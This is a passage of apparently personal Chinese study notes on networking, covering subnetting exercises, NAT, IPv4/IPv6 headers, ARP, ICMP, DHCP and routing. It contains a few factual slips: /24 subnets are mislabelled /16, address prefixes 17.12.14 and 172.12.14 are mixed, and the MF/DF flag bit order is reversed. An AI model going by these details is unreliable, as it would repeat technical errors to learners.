<p>块的起始地址一般不会分配,作为网络地址</p>
<p>块的最后地址也不会分配,作为本块的广播地址</p>
</blockquote>
<blockquote>
<p>已给一个组织分配了17.12.14.0&#x2F;26的地址块，该组织有3个部门，需要划分为32、16和16个地址的子块。</p>
<p>17.12.14.0&#x2F;26这个地址空间里有$2^{32-26}&#x3D;64$个地址,恰好划分为32+16+16</p>
<p>因此可以这样划分:</p>
<p>172.12.14.00’100000&#x2F;27,即172.12.14.32&#x2F;27</p>
<p>172.12.14.00’010000&#x2F;28,即172.12.14.16&#x2F;28</p>
<p>172.12.14.00’000000&#x2F;28,即172.12.14.0&#x2F;28</p>
</blockquote>
<blockquote>
<p>某单位分配到一个 B 类 IP 地址，其net-id为129.250.0.0。</p>
<p>该单位有4000台机器，平均分布在16个不同的地点。</p>
<p>如选用子网掩码为255.255.255.0，试给每一地点分配一个子网号码，</p>
<p>并计算出每个地点主机号码的最小值和最大值。</p>
<p>4000台机器均分到16个地点,则每个地点有250台,一个&#x2F;24子网中最多有256-2&#x3D;254台</p>
<p>因此一个255.255.255.0子网可以容纳250台机器</p>
<p>只需要将129.250.0.0&#x2F;16这样划分:</p>
<table>
<thead>
<tr>
<th>子网号(Binary)</th>
<th>子网号(Decimal)</th>
<th>网络地址</th>
<th>主机IP地址范围</th>
</tr>
</thead>
<tbody><tr>
<td>00000000</td>
<td>0</td>
<td>129.250.0.0&#x2F;16</td>
<td>129.250.0.1~129.250.0.254</td>
</tr>
<tr>
<td>00000001</td>
<td>1</td>
<td>129.250.1.0&#x2F;16</td>
<td>129.250.1.1~129.250.1.254</td>
</tr>
<tr>
<td>00000010</td>
<td>2</td>
<td>129.250.2.0&#x2F;16</td>
<td>129.250.2.1~129.250.2.254</td>
</tr>
<tr>
<td>00000011</td>
<td>3</td>
<td>129.250.3.0&#x2F;16</td>
<td>129.250.3.1~129.250.3.254</td>
</tr>
<tr>
<td></td>
<td></td>
<td>…</td>
<td></td>
</tr>
<tr>
<td>00001111</td>
<td>15</td>
<td>129.250.15.0&#x2F;16</td>
<td>129.250.15.1~129.250.15.254</td>
</tr>
</tbody></table>
</blockquote>
<h4 id="NAT地址转换"><a href="#NAT地址转换" class="headerlink" title="NAT地址转换"></a>NAT地址转换</h4><table>
<thead>
<tr>
<th>NAT类型</th>
<th>映射关系</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>静态NAT</td>
<td>一个内网地址对应一个公网地址</td>
<td></td>
</tr>
<tr>
<td>动态NAT</td>
<td>多个内网地址对应多个公网地址</td>
<td></td>
</tr>
<tr>
<td>PAT</td>
<td>多个内网地址对应一个公网地址的多个端口号</td>
<td></td>
</tr>
</tbody></table>
<h4 id="IPv4包"><a href="#IPv4包" class="headerlink" title="IPv4包"></a>IPv4包</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031183937685.png" alt="image-20221031183937685"></p>
<p>Data用于承载运输层的协议,比如TCP,UDP</p>
<p>Header是IPv4数据报首部,其中Option为可选项,除此之外的前20个字节是固定的</p>
<h5 id="VER"><a href="#VER" class="headerlink" title="VER"></a>VER</h5><p>4bits</p>
<p>IP协议的版本号,目前只有4和6两种,代表IPv4,IPv6</p>
<p>两种IP协议的首部有区别,但是接收方只要是看到这个VER字段,就可以决定后面用IPv6还是IPv4协议来解释后面的数据报了</p>
<h5 id="HLEN"><a href="#HLEN" class="headerlink" title="HLEN"></a>HLEN</h5><p>4bits</p>
<p>由于存在Option这个变量,为了区分首部和数据,需要维护一个值,记录IPv4数据报的首部共有多少字节.这个值就放在HLEN字段,共4位,最大是15,单位是4字节,也就是说,IPv4首部最大可以是15*4&#x3D;60字节,即Option最大是40字节</p>
<p>由于首部最小是20字节,因此HLEN这个值最小是5</p>
<h5 id="SERVICE"><a href="#SERVICE" class="headerlink" title="SERVICE"></a>SERVICE</h5><p>8bits</p>
<p>要么表示服务类型</p>
<p>要么表示区分服务</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031185352059.png" alt="image-20221031185352059"></p>
<h6 id="服务类型"><a href="#服务类型" class="headerlink" title="服务类型"></a>服务类型</h6><p>用于获得更好的服务</p>
<blockquote>
<p>注意服务类型不是高层协议类型</p>
<p>运输层上使用的是TCP还是UDP等等,是由Protocol字段决定的</p>
</blockquote>
<p>用于描述上层(运输层)的服务类型,</p>
<p>前3bits用于描述优先级</p>
<p>后1bits不使用</p>
<p>中间4bits,DTRC,用于描述服务类型</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212153218410.png" alt="image-20230212153218410"></p>
<h6 id="差分服务"><a href="#差分服务" class="headerlink" title="差分服务"></a>差分服务</h6><p>前6bits是码点子字段,后面2bits不用</p>
<p>其中码点的不同组合有不同的意义</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031185950842.png" alt="image-20221031185950842"></p>
<h5 id="Total-Length"><a href="#Total-Length" class="headerlink" title="Total Length"></a>Total Length</h5><p>16bits</p>
<p>总长度,len(header + data),单位,字节</p>
<p>最大长度不超过$2^{16}&#x3D;65536bytes$</p>
<p>又总长度不能超过链路层规定的最大传送单元MTU,以太网(正在使用的局域网规范)该值默认是1500字节</p>
<p>以太网链路层帧限制上层的数据报长度在46~1500字节之间,不够46字节需要填充</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031194233356.png" alt="MTU"></p>
<p>也就是说链路层的协议,其Header到Trailer之间的空间有限,最大是MTU规定的大小,IP数据报必须尊重地域差异,入乡随俗</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212153927371.png" alt="image-20230212153927371"></p>
<h5 id="Identification"><a href="#Identification" class="headerlink" title="Identification"></a>Identification</h5><p>16bits</p>
<p>一段数据由于MTU的限制,可能要分成多个包发送,本字段用来表明哪些包是同一个文件的.</p>
<h5 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h5><p>3bits</p>
<p>标志,用于标识该数据报是否可以分片,如果分片,是不是最后一片</p>
<p>最前面一个bit不用</p>
<p>中间一个bit是MF位,表征是否还有分片,1则还有分片,0则表明该数据报是最后一个分片</p>
<p>最后一个bit是DF位,表征是否可以分片,1不能分片,0允许分片</p>
<table>
<thead>
<tr>
<th>reserved</th>
<th>MF</th>
<th>DF</th>
</tr>
</thead>
</table>
<h5 id="Fragmentation-Offset"><a href="#Fragmentation-Offset" class="headerlink" title="Fragmentation Offset"></a>Fragmentation Offset</h5><p>13bits</p>
<p>分片偏移,对于同一个包的分片,</p>
<p>指出较长的分组在分片后,其中一片在原分组中的编号.单位:8字节<br>$$<br>分片偏移&#x3D;IP数据的第一个字节编号&#x2F;8<br>$$</p>
<p>$8\times 2^{13}&#x3D;2^{16}&#x3D;65536bytes$</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031194849825.png" alt="image-20221031194849825"></p>
<blockquote>
<p>本机在10.177.148.9,使用ICMP协议给61.150.43.78发送3500个字节的数据</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ping www.xidian.edu.cn -l 3500</span><br></pre></td></tr></table></figure>

<p>其中一组ping-pong应答:</p>
<p>去的包有三个,分别长1514,1514,587字节</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031201439099.png"></p>
<p>为啥可以比mtu&#x3D;1500多?因为这是整个数据报的总长度,包括了链路层的头</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031201739441.png" alt="image-20221031201739441"></p>
<p>前两个总长度1514字节的包,实际上IPv4数据报就是1500字节,其中IPv4首部占用了20字节</p>
</blockquote>
<h5 id="Time-to-live"><a href="#Time-to-live" class="headerlink" title="Time to live"></a>Time to live</h5><p>8bits</p>
<p>生存时间TTL,用于表示最大跳数,即该包还可以通过多少个路由器转发</p>
<p>为了防止数据报在网络上无休止地被转发而占用资源.路由器在转发每个数据报之前,都会首先将其TTL减一,如果降为0,则丢弃该数据报,不再转发</p>
<h5 id="Protocol"><a href="#Protocol" class="headerlink" title="Protocol"></a>Protocol</h5><p>8bits</p>
<p>协议类型,用于表示上层使用的协议,也就是data中存放的是啥协议的数据报</p>
<p>常用的协议编号如下</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031192637226.png" alt="image-20221031192637226"></p>
<h5 id="Header-checksum"><a href="#Header-checksum" class="headerlink" title="Header checksum"></a>Header checksum</h5><p>16bits</p>
<p>首部检校和,咋算的呢?</p>
<p>这里的首部包含Option字段,并且首部一定是4字节对齐的,Option如果不是4字节的倍数则向上取整到4字节的倍数</p>
<p>计算方式:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031193058326.png" alt="image-20221031193058326"></p>
<p>需要注意的是发送方最终填写的Check Sum是校验和计算值的反码</p>
<p>接收方也是将校验和计算结果取反检查是否是全零</p>
<p>比如</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031193231527.png" alt="image-20221031193231527"></p>
<h5 id="Source-Destination-IP-address"><a href="#Source-Destination-IP-address" class="headerlink" title="Source&#x2F;Destination IP address"></a>Source&#x2F;Destination IP address</h5><p>分别是32bits,源和目的主机的IP地址</p>
<h5 id="Option"><a href="#Option" class="headerlink" title="Option"></a>Option</h5><p>可以没有,最大40字节</p>
<p>首部附加选项</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031202035076.png" alt="image-20221031202035076"></p>
<h3 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h3><h4 id="IPv6地址"><a href="#IPv6地址" class="headerlink" title="IPv6地址"></a>IPv6地址</h4><p>长128位</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208205753221.png" alt="image-20230208205753221"></p>
<p>懒人表示法:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208210147178.png" alt="image-20230208210147178"></p>
<p>全零的段可以只写一个0</p>
<p>连续的全零段可以用一个Gap代替,全零段之间的冒号可以省去了.但是一个IPv6地址中<strong>只能有一个Gap</strong></p>
<blockquote>
<p>为啥只能有一个GAP?看看如何还原</p>
</blockquote>
<p>带有Gap的地址如何还原?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208210408867.png" alt="image-20230208210408867"></p>
<h4 id="IPv6包"><a href="#IPv6包" class="headerlink" title="IPv6包"></a>IPv6包</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212154305058.png" alt="image-20230212154305058"></p>
<p>IPv6头部包括固定40个字节的基础头部和可变长度的拓展头部,拓展头部的长度会在基础头部中给出</p>
<h5 id="Base-Header"><a href="#Base-Header" class="headerlink" title="Base Header"></a>Base Header</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212154406661.png" alt="image-20230212154406661"></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>作用</th>
<th>长度(bit)</th>
</tr>
</thead>
<tbody><tr>
<td>Version</td>
<td>IPv6版本</td>
<td>4</td>
</tr>
<tr>
<td>Traffic Class</td>
<td>优先级,发生拥塞时分组的优先级</td>
<td>4</td>
</tr>
<tr>
<td>Flow Label</td>
<td>流标号,类似于之前的Identification</td>
<td>24</td>
</tr>
<tr>
<td>Payload Length</td>
<td>有效载荷长度,即拓展头+IP数据的长度,单位:字节</td>
<td>16</td>
</tr>
<tr>
<td>Next Header</td>
<td>指明上层协议,类似于Protocol</td>
<td>8</td>
</tr>
<tr>
<td>Hop Limit</td>
<td>TTL</td>
<td></td>
</tr>
<tr>
<td>Source&#x2F;<br />Destination Address</td>
<td>源&#x2F;目的地址</td>
<td>128&#x2F;128</td>
</tr>
</tbody></table>
<h4 id="IPv4向IPv6过渡"><a href="#IPv4向IPv6过渡" class="headerlink" title="IPv4向IPv6过渡"></a>IPv4向IPv6过渡</h4><p>三种过渡方法:</p>
<table>
<thead>
<tr>
<th>过渡方法</th>
<th>原理</th>
</tr>
</thead>
<tbody><tr>
<td>双协议栈</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155148399.png" alt="image-20230212155148399" style="zoom:25%;" /></td>
</tr>
<tr>
<td>隧道</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155201345.png" alt="image-20230212155201345" style="zoom:25%;" /></td>
</tr>
<tr>
<td>头转换</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155229167.png" alt="image-20230212155229167" style="zoom:25%;" /></td>
</tr>
</tbody></table>
<h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><h4 id="数据报"><a href="#数据报" class="headerlink" title="数据报"></a>数据报</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101171944341.png" alt="image-20221101171944341"></p>
<h5 id="Hardware-Type"><a href="#Hardware-Type" class="headerlink" title="Hardware Type"></a>Hardware Type</h5><p>16bits</p>
<p>链路层协议类型,以太网为1</p>
<h5 id="Protocol-Type"><a href="#Protocol-Type" class="headerlink" title="Protocol Type"></a>Protocol Type</h5><p>16bits</p>
<p>网络层协议类型,IP协议为0x0800</p>
<h5 id="Hardware-length"><a href="#Hardware-length" class="headerlink" title="Hardware length"></a>Hardware length</h5><p>8bits</p>
<p>物理地址长度,比如以太网的物理地址,即MAC地址的长度就是6字节</p>
<h5 id="Protocol-length"><a href="#Protocol-length" class="headerlink" title="Protocol length"></a>Protocol length</h5><p>8bits</p>
<p>逻辑地址长度,比如IPv4地址的长度就是4字节</p>
<h5 id="Operation"><a href="#Operation" class="headerlink" title="Operation"></a>Operation</h5><p>16bits</p>
<p>ARP分组类型,有两种,Request请求或者Reply应答</p>
<h5 id="四个地址"><a href="#四个地址" class="headerlink" title="四个地址"></a>四个地址</h5><p>接下来是四个地址,依次是发送方的物理地址,发送方逻辑地址,接收方硬件地址,接收方逻辑地址</p>
<h4 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h4><p>如图拓扑中</p>
<p><a href="mailto:&#65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x2e;&#50;&#x35;&#49;">&#65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x2e;&#50;&#x35;&#49;</a>试图ping <a href="mailto:&#x42;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#49;&#x2e;&#50;&#x35;&#x30;">&#x42;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#49;&#x2e;&#50;&#x35;&#x30;</a></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101172908748.png" alt="image-20221101172908748"></p>
<p>在A的Ethernet0网卡上抓包</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173100332.png" alt="image-20221101173100332"></p>
<p>会发现首先发送和接受的并不是ICMP报文,而是arp报文,因为此时A计算机并不知道<a href="mailto:&#66;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#50;&#53;&#x30;">&#66;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#50;&#53;&#x30;</a>的物理地址是多少.因此首先要问一下</p>
<p>第20帧,A向子网发送ARP广播,其报文中包括自己的物理地址,逻辑地址,目的地的逻辑地址,但是目的地址的物理地址是一个假值</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173242804.png" alt="image-20221101173242804"></p>
<p>第21帧,A接收到了B的单播回答</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173435707.png" alt="image-20221101173435707"></p>
<p>此时两个主机的物理地址,逻辑地址都已经填好了</p>
<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>internet control message protocol 因特网控制协议,网络层协议</p>
<p>ICMP是<strong>网络层的协议</strong>,但是其在数据帧中的位置类似于TCP数据报的位置,都是在IPv4的data位置</p>
<h4 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234511301.png" alt="image-20221101234511301"></p>
<h5 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h5><p>ICMP报文分成差错报告和查询两种,体现在Type上</p>
<p>对于差错报告报文:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234922337.png" alt="差错报告类型"></p>
<p>对于查询报文:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234949153.png" alt="查询类型"></p>
<h5 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h5><p>代码要视报文类型决定</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101235149110.png" alt="image-20221101235149110"></p>
<h5 id="Checksum"><a href="#Checksum" class="headerlink" title="Checksum"></a>Checksum</h5><p>校验和</p>
<h4 id="差错报告报文"><a href="#差错报告报文" class="headerlink" title="差错报告报文"></a>差错报告报文</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❏  对于携带ICMP差错报文的数据报，不再生产ICMP差错报文。</span><br><span class="line">❏  对分段的数据报文，只对第一个分段产生ICMP差错报文。</span><br><span class="line">❏  对于多播地址的数据报文，不产生ICMP差错报文。</span><br><span class="line">❏ 具有特殊地址的数据报文，如127.0.0.0或者0.0.0.0，不产生ICMP差错报文。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>差错报文数据字段:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212160806776.png" alt="image-20230212160806776"></p>
<table>
<thead>
<tr>
<th>差错报告类型</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>目的端不可达</td>
<td>路由器无法路由或者目的主机无法传递数据时,报告目的端不可达</td>
<td></td>
</tr>
<tr>
<td>源端抑制</td>
<td>配合流量控制使用<br />路由器或者目的主机发生拥塞时,丢弃数据包,发送源端抑制</td>
<td></td>
</tr>
<tr>
<td>时间超时</td>
<td>TTL减为0时,路由器丢弃<br />或者报文的部分分片没有在有限时间抵达目的主机,由目的主机发送</td>
<td></td>
</tr>
<tr>
<td>参数问题</td>
<td>IP分组首部错误<br />路由器或者目的主机丢弃分组并发送参数问题报文</td>
<td></td>
</tr>
<tr>
<td>重定向</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212161420556.png" alt="image-20230212161420556" style="zoom:25%;" /><br />向源端报告更好的路由</td>
<td></td>
</tr>
</tbody></table>
<h4 id="查询报文"><a href="#查询报文" class="headerlink" title="查询报文"></a>查询报文</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212161525556.png" alt="image-20230212161525556"></p>
<table>
<thead>
<tr>
<th>查询报文类型</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>回送请求和回答</td>
<td>诊断网络</td>
<td>ping</td>
</tr>
<tr>
<td>时间戳请求和回答</td>
<td>确定数据报往返时间,同步</td>
<td></td>
</tr>
<tr>
<td>地址掩码请求和回答</td>
<td>获取地址对应掩码</td>
<td></td>
</tr>
<tr>
<td>路由器询问和通告</td>
<td>询问路由器是否正常工作</td>
<td>tracert</td>
</tr>
</tbody></table>
<h5 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/5337919-d1900102224993c8.png" alt="img"></p>
<h3 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h3><p>DHCP,Dynamic Host Configuration Protocol,动态主机地址分配协议</p>
<p>其前身是BOOTP(bootrap prottocol),引导程序协议,DHCP兼容BOOTP的功能</p>
<p>DHCP服务器有一个地址池,存放DHCP服务器可以动态分配的所有地址</p>
<h4 id="DHCP工作过程"><a href="#DHCP工作过程" class="headerlink" title="DHCP工作过程"></a>DHCP工作过程</h4><p>DHCP握手分为四步,主机要离开子网的时候,只有一步</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101233453767.png" alt="前四帧握手,最后一帧离开"></p>
<table>
<thead>
<tr>
<th>DHCP报文类型</th>
<th>时机</th>
<th>方向</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Discover</td>
<td>client刚加入子网,试图索要一个ip地址</td>
<td>DHCP client–广播-&gt;DHCP servers</td>
<td>向所有DHCP server索要ip地址</td>
</tr>
<tr>
<td>Offer</td>
<td>DHCP server收到了DIscover之后</td>
<td>DHCP server–单播–&gt;DHCP client</td>
<td>所有DHCP服务器都会尝试给出一个可用的ip地址</td>
</tr>
<tr>
<td>Request</td>
<td>client收到Offer之后</td>
<td>DHCP client–广播–&gt;DHCP servers</td>
<td>client接受其中一个offer,谢绝其他offer</td>
</tr>
<tr>
<td>ACK</td>
<td>被接受offer的server收到Request之后</td>
<td>DHCP server–单播–&gt;DHCP client</td>
<td>被接受offer的server回复收到</td>
</tr>
<tr>
<td>Release</td>
<td>client将要离开子网之时</td>
<td>DHCP client–广播–&gt;DHCP servers</td>
<td>通知所有DHCP server,本client要放弃ip地址了,可以收回到ip地址池</td>
</tr>
</tbody></table>
<p>其中四次握手同属于一个Transaction</p>
<h3 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h3><h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><p>路由:从某一网络设备发出,去往某个目的地,经过的路径</p>
<p>终端计算机,路由器,三层交换机上存在路由表</p>
<p>二层交换机上只有arp表</p>
<p>根据路由的发现方式,路由可以分成三种</p>
<p>直连路由:路由器自主发现相连端口的网络的路由</p>
<p>静态路由:人工维护路由表</p>
<p>动态路由:可周期性更新</p>
<h4 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107110756489.png" alt="image-20221107110756489"></p>
<p>子网掩码</p>
<p>网络地址</p>
<p>下一跳地址</p>
<p>朝向下一跳的端口</p>
<blockquote>
<p>比如网络拓扑长这样</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212162804137.png" alt="image-20230212162804137"></p>
<p>其中R1路由表长这样</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212162818521.png" alt="image-20230212162818521"></p>
<p>如果图22.6中的一个目的地址为180.70.65.140的分组到达路由器R1，说明其转发过程。</p>
<p>180.70.65.140这个地址属于180.70.65.128&#x2F;25网段,因此应该从m0口出去</p>
<p>首先路由器会在180.70.65.128&#x2F;25网段中使用ARP协议获得下一跳的MAC地址,然后将IP分组转发给下一跳</p>
</blockquote>
<h5 id="netstat-r"><a href="#netstat-r" class="headerlink" title="netstat -r"></a>netstat -r</h5><p>在win或者linux主机上使用netstat -r命令即可查看本机的路由表</p>
<p>比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135]</span><br><span class="line">└─# netstat -r</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span><br><span class="line">default         Executor        0.0.0.0         UG        0 0          0 eth0</span><br><span class="line">172.29.112.0    0.0.0.0         255.255.240.0   U         0 0          0 eth0</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>栏目</th>
<th>Destination</th>
<th>Gateway</th>
<th>Genmask</th>
<th>Flags</th>
<th>MSS Window</th>
<th>irtt</th>
<th>Iface</th>
</tr>
</thead>
<tbody><tr>
<td>意义</td>
<td>目的地址</td>
<td>网关</td>
<td>目的地址掩码</td>
<td></td>
<td></td>
<td></td>
<td>目标端口</td>
</tr>
</tbody></table>
<p>在eNSP路由器上用display ip routing-table也可以查看该路由器的路由表</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]display ip routing-table</span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">Routing Tables: Public</span><br><span class="line">         Destinations : 2        Routes : 2        </span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0</span><br><span class="line">      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0</span><br></pre></td></tr></table></figure>

<p>两者的主要区别就是这个NextHop</p>
<p>主机的网卡不需要下一跳地址,只需要维护一个网关的地址</p>
<p>路由器需要维护下一条的地址</p>
<h5 id="最长掩码匹配"><a href="#最长掩码匹配" class="headerlink" title="最长掩码匹配"></a>最长掩码匹配</h5><p>从路由表中选择具有最长掩码的路由</p>
<p>掩码越长,地址块越小,路由越具体</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163420071.png" alt="image-20230212163420071"></p>
<p>假如R2路由器收到了一个目的地址为140.24.7.192的地址,</p>
<p>该目的地址即属于140.24.7.192&#x2F;26网段,</p>
<p>又属于140.24.7.0&#x2F;24网段,</p>
<p>应该发往最长具有掩码的网段,即140.24.7.192&#x2F;26</p>
<h5 id="地址聚合"><a href="#地址聚合" class="headerlink" title="地址聚合"></a>地址聚合</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163621450.png" alt="image-20230212163621450"></p>
<h5 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h5><p>默认路由就这种</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107113423289.png" alt="image-20221107113423289"></p>
<p>子网掩码是0,意味着默认路由在路由表中排在最后,也就是最后的选择.</p>
<p>只要是前面都失配的包都会从默认路由这里匹配成功.该条记录只需要记录从本路由器中的哪个端口出去,下一条是谁</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107113605164.png" alt="image-20221107113605164"></p>
<p>比如这里的B路由器,除了10.1.0.0&#x2F;24,其他的包只能发往C路由器,于是B-&gt;C这条路由就是B的默认路由</p>
<h4 id="路由协议优先级"><a href="#路由协议优先级" class="headerlink" title="路由协议优先级"></a>路由协议优先级</h4><p>直连路由的优先级最高,因为 其最可靠</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221107112300287.png" alt="image-20221107112300287"></p>
<p>IP路由表为路由器实际工作时使用的路由表</p>
<p>建立该表的过程中可能考虑了很多路由协议,比如RIP,OSPF,对于同一个Destination的路由记录,优先使用高优先级路由协议给出的路由记录</p>
<p>比如之类对于24.10.0&#x2F;24这个地址,RIP和OSPF两种协议给出了不同的下一跳,必然有优劣.由于OSPF协议的优先级高,最终写入IP路由表的,来自OSPF协议</p>
<h4 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h4><h5 id="dijkstra"><a href="#dijkstra" class="headerlink" title="dijkstra"></a>dijkstra</h5><p>边权是链路代价,两节点不连接时链路代价为无穷大</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212163803322.png" alt="image-20230212163803322"></p>
<p>符号约定:</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>T</td>
<td>已经”拓展”的节点集合</td>
</tr>
<tr>
<td>N</td>
<td>网络中的节点集合</td>
</tr>
<tr>
<td>s</td>
<td>源点</td>
</tr>
<tr>
<td>w(i,j)</td>
<td>从i到j节点的链路代价</td>
</tr>
<tr>
<td>L(i)</td>
<td>目前从源点s到i节点的最小代价</td>
</tr>
</tbody></table>
<p>以1号节点为起点,计算其与其他所有点的最短距离</p>
<p>计算过程:</p>
<table>
<thead>
<tr>
<th>Iter</th>
<th><em>T</em></th>
<th><em>L</em>(2)</th>
<th>Path</th>
<th><em>L</em>(3)</th>
<th>Path</th>
<th><em>L</em>(4)</th>
<th>Path</th>
<th><em>L</em>(5)</th>
<th>Path</th>
<th><em>L</em>(6)</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>{1}</td>
<td>2</td>
<td>1-2</td>
<td>5</td>
<td>1-3</td>
<td>1</td>
<td>1-4</td>
<td>∞</td>
<td>-</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>{1,4}</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
<td>1-4-3</td>
<td>1</td>
<td>1-4</td>
<td>2</td>
<td>1-4-5</td>
<td>∞</td>
<td>-</td>
</tr>
<tr>
<td>3</td>
<td>{1, 2, 4}</td>
<td>2</td>
<td>1-2</td>
<td>4</td>
